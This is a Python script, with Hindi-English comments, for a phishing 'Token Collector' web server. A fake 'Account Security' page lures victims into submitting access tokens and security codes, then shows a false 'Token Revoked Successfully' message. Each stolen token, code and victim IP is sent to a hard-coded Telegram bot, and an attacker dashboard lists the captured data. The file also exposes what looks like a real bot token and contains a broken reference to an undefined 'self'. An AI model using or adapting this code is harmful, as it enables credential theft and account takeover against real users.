import http.server
import socketserver
import urllib.parse
import json
import time
import socket
from datetime import datetime

# ========== CONFIGURATION (YEH CHANGE KARO!) ==========
BOT_TOKEN = "8392676105:AAFpmEz5XkJh-YVJybt2uTOM2WET7hSFk1E"  # BotFather se lena hai
CHAT_ID = "7784572407"      # Apna chat ID ya channel ID
PORT = 8080
IP = '0.0.0.0'

stolen_tokens = []

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def send_to_telegram(access_token, securitycode):
    """Telegram bot ko PERFECT message bhejta hai"""
    try:
        import requests  # Pehle install karo: pip install requests
        
        message = f"""
🔥 *NEW TOKENS STOLEN!* 🔥

📱 *Victim IP:* `{self.client_address[0]}`
🌐 *Server IP:* `{get_local_ip()}`
⏰ *Time:* `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`
🔑 *Access Token:* `{access_token}`
🔒 *Security Code:* `{securitycode}`
👥 *Total Victims:* `{len(stolen_tokens)}`

---
*Token Collector Active* 💀
        """
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 200:
            print("✅ Telegram message SENT SUCCESSFULLY!")
            return True
        else:
            print(f"❌ Telegram Error: {response.text}")
            return False
            
    except ImportError:
        print("❌ Install requests: pip install requests")
        return False
    except Exception as e:
        print(f"❌ Telegram Error: {e}")
        return False

class TokenHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)
        
        if '/revoke?access_token=' in self.path:
            access_token = query_params.get('access_token', [''])[0]
            securitycode = query_params.get('securitycode', [''])[0]
            
            # Data save karo
            stolen_data = {
                'ip': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown'),
                'access_token': access_token,
                'securitycode': securitycode,
                'timestamp': datetime.now().isoformat()
            }
            stolen_tokens.append(stolen_data)
            
            # Console mein dikhao
            print(f"\n🔥 VICTIM CAUGHT!")
            print(f"IP: {self.client_address[0]}")
            print(f"Token: {access_token[:30]}...")
            print(f"Code: {securitycode}")
            
            # Bot ko bhejo
            telegram_sent = send_to_telegram(access_token, securitycode)
            print(f"Telegram: {'✅' if telegram_sent else '❌'}")
            
            # Success page
            self.send_success_page()
            
        elif self.path == '/dashboard':
            self.send_dashboard()
            
        elif self.path == '/api/tokens':
            self.send_json_tokens()
            
        else:
            self.send_fake_page()

    def send_success_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        html = """
        <html><head><title>Success</title></head>
        <body style="font-family:Arial;text-align:center;padding:50px;background:#f0f0f0;">
            <h1 style="color:green;">✅ Token Revoked Successfully!</h1>
            <p>Access token securely revoked.</p>
            <p>Security code verified.</p>
        </body></html>
        """
        self.wfile.write(html.encode())

    def send_dashboard(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        local_ip = get_local_ip()
        html = f"""
        <!DOCTYPE html>
        <html>
        <head><title>Dashboard</title>
        <meta http-equiv="refresh" content="5">
        <style>body{{background:#1a1a2e;color:white;font-family:Arial;padding:20px;}}
        .endpoint{{background:#e94560;padding:15px;border-radius:10px;margin:20px 0;}}
        .token{{background:#0f3460;padding:15px;margin:10px 0;border-radius:5px;word-break:break-all;}}</style>
        </head>
        <body>
            <h1>🔥 Token Collector</h1>
            <p>Server: http://{local_ip}:{PORT}</p>
            <div class="endpoint">
                <strong>🎯 Endpoint:</strong><br>
                <code>http://{local_ip}:{PORT}/revoke?access_token=VICTIM_TOKEN&securitycode=CODE</code>
            </div>
            <h3>📋 Stolen Tokens ({len(stolen_tokens)}):</h3>
        """
        for data in stolen_tokens[-10:]:
            html += f"""
            <div class="token">
                <strong>{data['access_token'][:40]}...</strong><br>
                <small>{data['securitycode']} | {data['ip']} | {data['timestamp']}</small>
            </div>
            """
        html += "</body></html>"
        self.wfile.write(html.encode())

    def send_json_tokens(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(stolen_tokens).encode())

    def send_fake_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        html = """
        <html><body style="font-family:Arial;max-width:400px;margin:50px auto;">
        <h2>🔒 Account Security</h2>
        <p>Use this link:<br>
        <code>/revoke?access_token=YOUR_TOKEN&securitycode=YOUR_CODE</code></p>
        </body></html>
        """
        self.wfile.write(html.encode())

    def log_message(self, format, *args):
        pass

def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or CHAT_ID == "YOUR_CHAT_ID_HERE":
        print("❌ BOT_TOKEN aur CHAT_ID set karo!")
        return
    
    server = socketserver.TCPServer((IP, PORT), TokenHandler)
    local_ip = get_local_ip()
    
    print("="*60)
    print("🔥 TOKEN COLLECTOR STARTED!")
    print("="*60)
    print(f"🌐 Server: http://{local_ip}:{PORT}")
    print(f"📊 Dashboard: http://{local_ip}:{PORT}/dashboard")
    print(f"🎯 Endpoint: http://{local_ip}:{PORT}/revoke?access_token=TOKEN&securitycode=CODE")
    print("="*60)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n👋 Stopped!")

if __name__ == "__main__":
    main()